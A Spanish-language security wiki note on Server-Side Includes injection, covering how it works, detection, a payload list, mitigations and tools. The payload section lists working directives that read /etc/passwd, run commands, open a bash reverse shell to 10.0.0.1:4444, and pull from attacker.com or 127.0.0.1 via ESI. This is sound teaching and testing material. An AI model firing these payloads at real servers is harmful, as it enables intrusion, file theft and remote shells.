---
tags:
  - seguridad-web
  - owasp
  - ssi
aliases:
  - SSI (Server-Side Includes)
  - Server-Side Includes
  - SSI Injection
  - Inyección SSI
---

# SSI (Server-Side Includes)

**La inyección SSI abusa de las directivas Server-Side Includes que algunos servidores web (Apache, Nginx con módulo, IIS) procesan dentro de páginas `.shtml` antes de enviarlas, permitiendo ejecutar comandos o incluir archivos si la entrada del usuario acaba en una página interpretada.**

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Cuando SSI está habilitado, el servidor busca etiquetas `<!--#... -->` en la respuesta y las ejecuta del lado servidor. Si un dato controlado por el usuario (un campo reflejado, un nombre de archivo, un User-Agent guardado en una página) se renderiza en un documento con SSI activo, el atacante inyecta directivas que el servidor ejecutará. **ESI** (Edge Side Includes) es la variante a nivel de proxy/CDN y se explota de forma parecida.

## Detección y pruebas
Busca extensiones `.shtml`, `.shtm`, `.stm` o cabeceras que indiquen SSI. Inyecta una directiva inofensiva como `<!--#echo var="DATE_LOCAL" -->`; si la respuesta muestra la fecha en vez del texto literal, SSI se está procesando. Prueba también puntos de reflexión almacenada (logs renderizados, nombres de archivo).

## Explotación / payloads
**Variables y ficheros:**

```
<!--#echo var="DATE_LOCAL" -->
<!--#printenv -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="secret.txt" -->
```

**Ejecución de comandos (si `exec` está permitido):**

```
<!--#exec cmd="ls -la" -->
<!--#exec cmd="id" -->
<!--#exec cmd="/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" -->
```

**ESI (Edge Side Includes)** — contra proxies que lo soporten:

```
<esi:include src="http://attacker.com/" />
<esi:include src="http://127.0.0.1/admin" />     # SSRF vía caché
```

## Mitigación
- Deshabilitar SSI donde no se use (`Options -Includes`) y, si es imprescindible, usar `IncludesNOEXEC` para vetar `exec`/`include` de programas.
- No renderizar entrada del usuario en páginas con SSI activo; codificar `<`, `>`, `"`, `&` antes de escribir.
- Aislar el servidor con privilegios mínimos; SSI con `exec` ejecuta con el usuario del servidor web.
- En CDN/proxy, deshabilitar el procesamiento ESI sobre contenido no confiable.

## Herramientas
- **Burp Suite** — inyección de directivas y detección por reflexión.
- **curl** — pruebas manuales de `.shtml` y cabeceras.

---
🔗 Relacionado: [[Inyección CRLF]] · [[SSTI (Server-Side Template Injection)]] · [[Inyección de comandos]] · [[Inclusión de archivos (LFI-RFI)]]
📚 Fuente: [PayloadsAllTheThings — Server Side Include Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection) (MIT, © Swissky)
